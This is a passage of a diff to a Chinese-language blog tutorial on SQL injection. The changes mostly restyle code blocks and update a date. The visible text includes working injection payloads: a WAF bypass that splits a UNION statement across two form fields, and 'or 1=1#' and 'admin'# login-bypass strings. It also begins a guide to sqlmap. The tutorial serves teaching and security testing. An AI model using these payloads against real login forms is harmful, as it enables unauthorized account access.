 </h3><p>部分表单（比如登录界面）是通过拼凑用户输入的内容来进行查询的，比如：</p>
 <div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">$param_a</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_GET</span>[<span style="color:#98c379">&#39;a&#39;</span>];
@@ -2166,18 +2166,18 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 </span></span><span style="display:flex;"><span><span style="color:#e06c75">$sql</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT * FROM user WHERE name = &#39;&#34;</span> <span style="color:#56b6c2">.</span> <span style="color:#e06c75">$param_a</span> <span style="color:#56b6c2">.</span> <span style="color:#98c379">&#34;&#39; AND password = &#39;&#34;</span> <span style="color:#56b6c2">.</span> <span style="color:#e06c75">$param_b</span> <span style="color:#56b6c2">.</span> <span style="color:#98c379">&#34;&#39;&#34;</span>;
 </span></span></code></pre></div><p>WAF可能对单个的内容做了过滤，这时候我们就可以把注入语句拆分</p>
 <p>a部分输入：</p>
-<pre tabindex="0"><code>1&#39; union/*
-</code></pre><p>b部分输入：</p>
-<pre tabindex="0"><code>*/select 1,2#
-</code></pre><p>这样拼凑之后的sql语句就是：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union/*
+</span></span></code></pre></div><p>b部分输入：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>*/select 1,2#
+</span></span></code></pre></div><p>这样拼凑之后的sql语句就是：</p>
 <div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#56b6c2">*</span> <span style="color:#c678dd">FROM</span> <span style="color:#c678dd">user</span> <span style="color:#c678dd">WHERE</span> <span style="color:#e06c75">name</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;1&#39;</span> <span style="color:#c678dd">union</span><span style="color:#7f848e">/*&#39; AND password = &#39;*/</span><span style="color:#c678dd">select</span> <span style="color:#d19a66">1</span>,<span style="color:#d19a66">2</span><span style="color:#56b6c2">#</span><span style="color:#98c379">&#39;
 </span></span></span><span style="display:flex;"><span><span style="color:#98c379">														  		  ~~~~~~~~~~~~~~~~~~~~~~~~~
 </span></span></span></code></pre></div><p>我们就把中间b的部分注释掉了，并且绕过了WAF，成功注入了查询语句</p>
 <h3 id="万能密码">万能密码
 </h3><p><strong>还可以构造出万能密码</strong></p>
 <p>我们使用管理员的账号登录，假设是admin，密码输入：</p>
-<pre tabindex="0"><code>&#39;or 1=1# 
-</code></pre><p>这样sql语句就变成了：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&#39;or 1=1# 
+</span></span></code></pre></div><p>这样sql语句就变成了：</p>
 <div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#56b6c2">*</span> <span style="color:#c678dd">FROM</span> <span style="color:#c678dd">user</span> <span style="color:#c678dd">WHERE</span> <span style="color:#e06c75">name</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;admin &#39;</span> <span style="color:#c678dd">AND</span> <span style="color:#e06c75">password</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;&#39;</span><span style="color:#c678dd">or</span> <span style="color:#d19a66">1</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">1</span><span style="color:#56b6c2">#</span> <span style="color:#98c379">&#39;
 </span></span></span></code></pre></div><p><strong>我们竟然直接登录了管理员的账号，这是为什么呢？</strong></p>
 <p>一般没有进行SQL语句参数化的登录语句是这样的：</p>
@@ -2188,8 +2188,8 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 </span></span></code></pre></div><p>or是或者的意思，也就是Password=xxx的时候可以登录，也可以是1=1的时候可以登录</p>
 <p>但1永远等于1，所以登录条件永远成立！</p>
 <p>或者换一种方式，我们直接在账号处就使用：</p>
-<pre tabindex="0"><code>admin&#39;# 
-</code></pre><p>密码随便填写，这样sql语句就是：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>admin&#39;# 
+</span></span></code></pre></div><p>密码随便填写，这样sql语句就是：</p>
 <div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#56b6c2">*</span> <span style="color:#c678dd">FROM</span> <span style="color:#c678dd">user</span> <span style="color:#c678dd">WHERE</span> <span style="color:#e06c75">name</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;admin&#39;</span><span style="color:#56b6c2">#</span> <span style="color:#98c379">&#39; AND password = &#39;</span><span style="color:#e06c75">xxx</span><span style="color:#98c379">&#39;
 </span></span></span></code></pre></div><p>完全忽略了密码的校验，也就顺利登录了管理员账号</p>
 <p><span style="color:#2c8af0;font-size:20px"><strong>恭喜，你现在已经学会了手工注入！</strong></span></p>
@@ -2197,7 +2197,7 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 <p><span style="color:#2c8af0;font-size:30px"><strong>当然是有的！那就是使用自动化注入工具&ndash;SqlMap！</strong></span></p>
 <h1 id="sqlmap使用">SqlMap使用
 </h1><p><strong>下载地址：</strong></p>
-<pre tabindex="0"><code>git clone https://github.com/sqlmapproject/sqlmap.git
+<pre tabindex="0"><code class="language-texttext" data-lang="texttext">git clone https://github.com/sqlmapproject/sqlmap.git
 </code></pre><h2 id="基本使用步骤">基本使用步骤
 </h2><h3 id="检查注入点">检查注入点
 </h3><p><mark><strong>-u：指定目标url</strong></mark></p>
@@ -2411,7 +2411,7 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 
 
         <span>
-            最后更新于 2025-07-09
+            最后更新于 2025-07-10
         </span>
     </section></footer>
 
